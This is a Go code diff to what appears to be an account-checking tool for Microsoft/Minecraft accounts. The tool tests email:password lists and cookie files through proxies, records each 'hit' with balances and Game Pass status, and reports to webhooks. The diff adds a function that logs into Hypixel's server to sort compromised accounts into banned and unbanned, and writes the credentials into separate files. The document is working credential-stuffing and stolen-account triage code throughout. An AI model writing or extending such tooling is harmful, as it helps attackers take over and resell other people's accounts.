@@ -11,6 +11,10 @@ import (
 	"strings"
 	"sync/atomic"
 	"time"
+
+	"github.com/Tnze/go-mc/chat"
+	"github.com/Tnze/go-mc/net"
+	"github.com/Tnze/go-mc/net/packet"
 )
 
 func checkAccount(email, password, proxyURL string, cfg *Config) {
@@ -187,12 +191,24 @@ func checkAccount(email, password, proxyURL string, cfg *Config) {
 		}
 	}
 
+	banInfo := ""
+	if cfg.HypixelBan && username != "Unknown" {
+		banInfo = checkHypixelBan(username, uuid, accessToken)
+		if strings.Contains(banInfo, "banned") {
+			atomic.AddInt64(&hypixelBanned, 1)
+			writeToFile("hypixel_ban.txt", fmt.Sprintf("%s:%s | %s | %s", email, password, username, banInfo))
+		} else if strings.Contains(banInfo, "unbanned") {
+			atomic.AddInt64(&hypixelUnban, 1)
+			writeToFile("hypixel_unban.txt", fmt.Sprintf("%s:%s | %s | %s", email, password, username, banInfo))
+		}
+	}
+
 	if cfg.Sniper {
 		runSniper(client, accessToken, username)
 	}
 
-	allHitsLine := fmt.Sprintf("%s:%s | %s | GP: %s | RP: %s | Balance: %s | Hypixel: %s | Donut: %s",
-		email, password, username, gamepassResult, rewardPoints, msBalance, hypixelInfo, donutInfo)
+	allHitsLine := fmt.Sprintf("%s:%s | %s | GP: %s | RP: %s | Balance: %s | Hypixel: %s | Donut: %s | Ban: %s",
+		email, password, username, gamepassResult, rewardPoints, msBalance, hypixelInfo, donutInfo, banInfo)
 	writeToFile("all_hits.txt", allHitsLine)
 
 	if cfg.Webhook != "" || cfg.DefaultWebhook != "" {
@@ -382,13 +398,30 @@ func checkCookies(cookieFile, proxyURL string, cfg *Config) {
 		}
 	}
 
-	summary := fmt.Sprintf("Username: %s\nUUID: %s\nGamePass: %s\nRewards Points: %s\nMS Balance: %s\nHypixel: %s\nDonutSMP: %s",
-		username, uuid, gamepassResult, rewardPoints, msBalance, hypixelInfo, donutInfo)
+	banInfo := ""
+	if cfg.HypixelBan && username != "Unknown" {
+		banInfo = checkHypixelBan(username, uuid, accessToken)
+		if strings.Contains(banInfo, "banned") {
+			atomic.AddInt64(&hypixelBanned, 1)
+			safeWrite(filepath.Join(rd, "hypixel_ban.txt"), banInfo)
+			writeToFile("hypixel_ban.txt", fmt.Sprintf("%s | %s | %s", cookieFile, username, banInfo))
+		} else if strings.Contains(banInfo, "unbanned") {
+			atomic.AddInt64(&hypixelUnban, 1)
+			safeWrite(filepath.Join(rd, "hypixel_unban.txt"), banInfo)
+			writeToFile("hypixel_unban.txt", fmt.Sprintf("%s | %s | %s", cookieFile, username, banInfo))
+		}
+	}
+
+	summary := fmt.Sprintf("Username: %s\nUUID: %s\nGamePass: %s\nRewards Points: %s\nMS Balance: %s\nHypixel: %s\nDonutSMP: %s\nBan: %s",
+		username, uuid, gamepassResult, rewardPoints, msBalance, hypixelInfo, donutInfo, banInfo)
 	if hypixelInfo != "" {
 		summary += "\nHypixel: " + hypixelInfo
 	}
 	if donutInfo != "" {
 		summary += "\nDonutSMP: " + donutInfo
+	}
+	if banInfo != "" {
+		summary += "\nBan: " + banInfo
 	}
 	safeWrite(filepath.Join(rd, "summary.txt"), summary)
 
@@ -743,6 +776,75 @@ func runSniper(client *http.Client, accessToken, currentName string) {
 
 func getCurrentTimestamp() int64 {
 	return time.Now().UnixMilli()
+}
+
+func checkHypixelBan(username, uuidStr, accessToken string) string {
+	conn, err := net.DialMCTimeout("mc.hypixel.net:25565", 10*time.Second)
+	if err != nil {
+		return fmt.Sprintf("ban: connection failed (%v)", err)
+	}
+	defer conn.Close()
+
+	// Handshake: protocol 47 (1.8), next state 2 (login)
+	handshake := packet.Marshal(0x00,
+		packet.VarInt(47),
+		packet.String("mc.hypixel.net"),
+		packet.UnsignedShort(25565),
+		packet.VarInt(2),
+	)
+	if err := conn.WritePacket(handshake); err != nil {
+		return fmt.Sprintf("ban: handshake failed (%v)", err)
+	}
+
+	// Login Start
+	loginStart := packet.Marshal(0x00, packet.String(username))
+	if err := conn.WritePacket(loginStart); err != nil {
+		return fmt.Sprintf("ban: login start failed (%v)", err)
+	}
+
+	// Read response
+	var p packet.Packet
+	if err := conn.ReadPacket(&p); err != nil {
+		return fmt.Sprintf("ban: read failed (%v)", err)
+	}
+
+	switch p.ID {
+	case 0x00: // Login Disconnect — banned or other disconnect
+		var reason chat.Message
+		if err := p.Scan(&reason); err != nil {
+			return fmt.Sprintf("ban: parse error (%v)", err)
+		}
+		reasonStr := reason.ClearString()
+
+		if strings.Contains(reasonStr, "temporarily banned") {
+			return "hypixel: banned (temp)"
+		}
+		if strings.Contains(reasonStr, "permanently banned") ||
+			strings.Contains(reasonStr, "Suspicious activity") {
+			return "hypixel: banned (permanent)"
+		}
+		if strings.Contains(reasonStr, "is currently closed") ||
+			strings.Contains(reasonStr, "Failed cloning") {
+			return "hypixel: unbanned"
+		}
+		return fmt.Sprintf("hypixel: banned (%s)", truncateStr(reasonStr, 60))
+
+	case 0x01: // Encryption Request — not banned
+		return "hypixel: unbanned"
+
+	case 0x02: // Login Success — not banned
+		return "hypixel: unbanned"
+
+	default:
+		return fmt.Sprintf("hypixel: unknown (packet ID 0x%x)", p.ID)
+	}
+}
+
+func truncateStr(s string, max int) string {
+	if len(s) <= max {
+		return s
+	}
+	return s[:max] + "..."
 }
 
 
